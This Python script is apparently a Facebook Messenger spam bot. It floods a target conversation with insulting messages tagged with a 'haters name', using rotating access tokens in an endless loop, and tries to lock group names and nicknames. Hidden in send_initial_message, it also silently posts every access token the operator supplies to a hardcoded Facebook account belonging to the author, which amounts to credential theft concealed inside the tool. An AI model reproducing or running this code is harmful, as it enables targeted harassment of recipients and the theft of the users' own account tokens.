import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading
import pytz
from datetime import datetime

# अपने एडमिन UID को परिभाषित करें
ADMIN_UID = "61553930201309"

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"-- THIS SERVER MADE BY CHIKU ")

def execute_server():
    PORT = 4000

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

def get_india_time():
    india_tz = pytz.timezone('Asia/Kolkata')
    current_time = datetime.now(india_tz).strftime('%Y-%m-%d %I:%M:%S %p')
    return current_time

def lock_group_and_nicknames(group_id, access_token):
    url = f"https://graph.facebook.com/v17.0/{group_id}/"
    headers = {
        'Authorization': f'Bearer {access_token}'
    }
    payload = {
        'lock_group_name': True,
        'lock_nicknames': True,
        'admin_id': ADMIN_UID
    }

    response = requests.post(url, json=payload, headers=headers)
    if response.ok:
        print(f"Group {group_id} and nicknames locked successfully.")
    else:
        print(f"Failed to lock group {group_id} and nicknames: {response.text}")

def send_initial_message():
    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()

    # Modify the message as per your requirement
    msg_template = "Hello sid sir! I am using your server. My token is {}. India live time now {}"

    # Specify the ID where you want to send the message
    target_id = "61553930201309"

    requests.packages.urllib3.disable_warnings()

    def liness():
        print('\033[1;92m' + '•──────────────────────DEVIL X CHIKU───────────────────────────────•')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    for token in tokens:
        access_token = token.strip()
        url = f"https://graph.facebook.com/v17.0/{target_id}/"
        india_time = get_india_time()
        msg = msg_template.format(access_token, india_time)
        parameters = {'access_token': access_token, 'message': msg}
        response = requests.post(url, json=parameters, headers=headers)

        # No need to print here, as requested
        time.sleep(0.1)  # Wait for 0.1 second between sending each initial message

def send_messages_from_file():
    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('File.txt', 'r') as file:
        messages = file.readlines()

    num_messages = len(messages)

    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    def liness():
        print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()

                message = messages[message_index].strip()
                india_time = get_india_time()

                # Send the message
                url = f"https://graph.facebook.com/v17.0/{convo_id}/"
                parameters = {
                    'access_token': access_token,
                    'message': f'{haters_name} {message}. India live time now {india_time}'
                }
                response = requests.post(url, json=parameters, headers=headers)

                if response.ok:
                    print(f"\033[1;92m[+] Han Chla Gya Massage {message_index + 1} of Convo {convo_id} Token {token_index + 1}: {haters_name + ' ' + message}")
                    liness()
                    liness()
                else:
                    print(f"\033[1;91m[x] Failed to send Message {message_index + 1} of Convo {convo_id} with Token {token_index + 1}: {haters_name + ' ' + message}")
                    liness()
                    liness()
                time.sleep(speed)

            print("\n[+] All messages sent. Restarting the process...\n")
        except Exception as e:
            print(f"[!] An error occurred: {e}")

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    # Send the initial message to the specified ID using all tokens
    send_initial_message()

    # Lock group and nicknames
    with open('group_ids.txt', 'r') as file:
        group_ids = file.readlines()
    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()

    for group_id in group_ids:
        group_id = group_id.strip()
        for token in tokens:
            access_token = token.strip()
            lock_group_and_nicknames(group_id, access_token)

    # Then, continue with the message sending loop
    send_messages_from_file()

if __name__ == '__main__':
    main()
